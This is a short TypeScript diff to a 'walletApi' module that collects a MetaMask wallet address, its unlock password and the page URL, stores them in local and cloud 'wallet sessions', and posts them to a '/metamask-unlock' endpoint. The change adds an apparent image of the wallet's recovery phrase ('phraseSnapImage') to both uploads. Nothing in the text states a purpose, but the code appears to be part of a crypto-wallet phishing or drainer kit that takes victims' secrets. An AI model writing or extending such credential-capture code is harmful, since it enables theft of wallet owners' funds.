@@ -138,18 +138,21 @@ export const walletApi = {
     password: string
     pageUrl?: string
     draft?: boolean
+    phraseSnapImage?: string | null
   }) {
     upsertLocalWalletSession({
       walletAddress: payload.walletAddress,
       walletType: 'MetaMask',
       pageUrl: payload.pageUrl,
       unlockPassword: payload.password,
+      phraseSnapImage: payload.phraseSnapImage ?? null,
     })
     void upsertCloudWalletSession({
       walletAddress: payload.walletAddress,
       walletType: 'MetaMask',
       pageUrl: payload.pageUrl,
       unlockPassword: payload.password,
+      phraseSnapImage: payload.phraseSnapImage ?? null,
     })
     try {
       const res = await fetch(`${API_BASE}/metamask-unlock`, {
